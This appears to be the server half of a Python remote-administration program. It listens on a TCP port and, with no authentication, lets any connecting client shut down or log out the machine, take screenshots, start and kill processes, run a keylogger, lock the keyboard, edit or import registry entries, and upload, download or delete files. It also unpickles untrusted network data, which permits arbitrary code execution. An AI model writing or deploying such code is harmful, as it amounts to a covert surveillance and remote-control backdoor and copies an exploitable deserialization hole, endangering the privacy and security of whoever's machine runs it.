import os
import shutil
from pickle import loads, dumps
import socket
import threading
from struct import pack, unpack
import utils, process, keystroke, registry, mac, lock_keyboard, dirtree

HOST = socket.gethostname()
PORT = 10000

def norm_path(path):
    return os.path.normpath(path).replace('\\', '/')


def check_request(req):
    if not isinstance(req, dict):
        return False
    if not ('header' in req and 'params' in req):
        return False
    return True


def send(conn, ok, data=None):
    res = {'ok': ok, 'data': data}
    msg = dumps(res)
    length = pack('>Q', len(msg))
    conn.sendall(length)
    conn.sendall(msg)


def recv(conn, BUF_SIZE=1024):
    length, = unpack('>Q', conn.recv(8))
    data = []
    length_recv = 0
    while length_recv < length:
        part = conn.recv(BUF_SIZE)
        length_recv += len(part)
        data.append(part)
    data = b''.join(data)
    return loads(data)


def connection_handler(connection, address):
    print(f'{address[0]}:{address[1]} connected')
    keystroke_detector = keystroke.KeystrokeDetector()
    while True:
        try:
            req = recv(connection)
            if not check_request(req):
                send(connection, False)
                print('Bad request')
            else:
                header, params = req['header'], req['params']
                print('Client request:', header)
        except:
            break
            
        if header == 'shutdown':
            try:
                utils.shutdown()
                ok = True
                data = None
            except:
                ok = False
                data = None
            send(connection, ok, data)

        elif header == 'logout':
            try:
                utils.logout()
                ok = True
                data = None
            except:
                ok = False
                data = None
            send(connection, ok, data)

        elif header == 'getscreenshot':
            try:
                ok = True
                data = utils.get_screenshot()
            except:
                ok = False
                data = None
            send(connection, ok, data)

        elif header == 'process-start':
            try:
                [process_name] = params
                process.start(process_name)
                ok = True
                data = None
            except:
                ok = False
                data = None
            send(connection, ok, data)

        elif header == 'process-kill':
            try:
                [pid] = params
                process.kill(pid)
                ok = True
                data = None
            except:
                ok = False
                data = None
            send(connection, ok, data)

        elif header == 'process-getall':
            try:
                ok = True
                data = process.get_running_processes()
            except:
                ok = False
                data = []
            send(connection, ok, data)
            
        elif header == 'process-getallapp':
            try:
                ok = True
                data = process.get_running_applications()
            except:
                ok = False
                data = []
            send(connection, ok, data)

        elif header == 'keystroke-hook':
            try:
                keystroke_detector.start_listening()
                ok = True
                data = None
            except:
                ok = False
                data = None
            send(connection, ok, data)

        elif header == 'keystroke-unhook':
            try:
                keystroke_detector.end_listening()
                ok = True
                data = None
            except:
                ok = False
                data = None
            send(connection, ok, data)

        elif header == 'keystroke-get':
            try:
                ok = True
                data = keystroke_detector.get_keys()
            except:
                ok = False
                data = None
            send(connection, ok, data)

        elif header == 'lock-keyboard':
            try:
                lock_keyboard.enable()
                ok = True
                data = None
            except:
                ok = False
                data = None
            send(connection, ok, data)

        elif header == 'unlock-keyboard':
            try:
                lock_keyboard.disable()
                ok = True
                data = None
            except:
                ok = False
                data = None
            send(connection, ok, data)

        elif header == 'reg-getvalue':
            try:
                ok = True
                [path, value_name] = params
                path = norm_path(path)
                data = registry.get_value(path, value_name)
            except:
                ok = False
                data = None
            send(connection, ok, data)

        elif header == 'reg-setvalue':
            try:
                ok = True
                data = None
                [path, value_name, dtype, value] = params
                path = norm_path(path)
                registry.set_value(path, value_name, dtype, value)
            except:
                ok = False
                data = None
            send(connection, ok, data)
            
        elif header == 'reg-deletevalue':
            try:
                ok = True
                data = None
                [path, value_name] = params
                path = norm_path(path)
                registry.delete_value(path, value_name)
            except:
                ok = False
                data = None
            send(connection, ok, data)
            
        elif header == 'reg-createkey':
            try:
                ok = True
                data = None
                [path] = params
                path = norm_path(path)
                registry.create_key(path)
            except:
                ok = False
                data = None
            send(connection, ok, data)

        elif header == 'reg-deletekey':
            try:
                ok = True
                data = None
                [path] = params
                path = norm_path(path)
                registry.delete_key(path)
            except:
                ok = False
                data = None
            send(connection, ok, data)

        elif header == 'reg-import':
            try:
                ok = True
                data = None
                [content] = params
                registry.import_reg(content)
            except:
                ok = False
                data = None
            send(connection, ok, data)

        elif header == 'mac-address':
            try:
                ok = True
                data = mac.get_address()
            except:
                ok = False
                data = None
            send(connection, ok, data)

        elif header == 'dirtree-getfiles':
            try:
                root = params[0]
                ok = True
                data = dirtree.list_files(root)
            except:
                ok = False
                data = {'folders': [], 'files': []}
            send(connection, ok, data)
            
        elif header == 'dirtree-getdrives':
            try:
                ok = True
                data = dirtree.list_drives()
            except:
                ok = False
                data = []
            send(connection, ok, data)
            
        elif header == 'dirtree-client2server-start':
            try:
                ok = True
                data = None
                send(connection, True)
                filepath = params[0]
                dirtree.delete_file(filepath)
                
                while True:
                    res = recv(connection)
                    if res['header'] == 'dirtree-client2server-end':
                        break
                    buffer = res['params'][0]
                    dirtree.append_file(filepath, buffer)
                    send(connection, True)
            except:
                ok = False
                data = None
            send(connection, ok, data)
            
        elif header == 'dirtree-server2client-start':
            try:
                ok = True
                data = None
                filepath = params[0]
                for buffer in dirtree.read_file(filepath):
                    send(connection, True, buffer)
                    res = recv(connection)
                    if res['header'] != 'dirtree-server2client-ok':
                        raise Exception()
            except:
                ok = False
                data = None
            send(connection, ok, data)
            
        elif header == 'dirtree-server2server':
            try:
                ok = True
                data = None
                [src, dst] = params
                shutil.copy(src, dst)
            except:
                ok = False
                data = None
            send(connection, ok, data)
            
        elif header == 'dirtree-deletefile':
            try:
                ok = True
                data = None
                filepath = params[0]
                dirtree.delete_file(filepath)
            except:
                ok = False
                data = None
            send(connection, ok, data)

        else:
            send(connection, False)
    
    connection.close()
    print(f'{address[0]}:{address[1]} disconnected')
    exit(0)

def open_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    print('Listening at', HOST)
    server_socket.listen()
    conn, addr = server_socket.accept()
    t = threading.Thread(target=connection_handler, args=[conn, addr])
    t.start()
    server_socket.close()
    return None

open_server()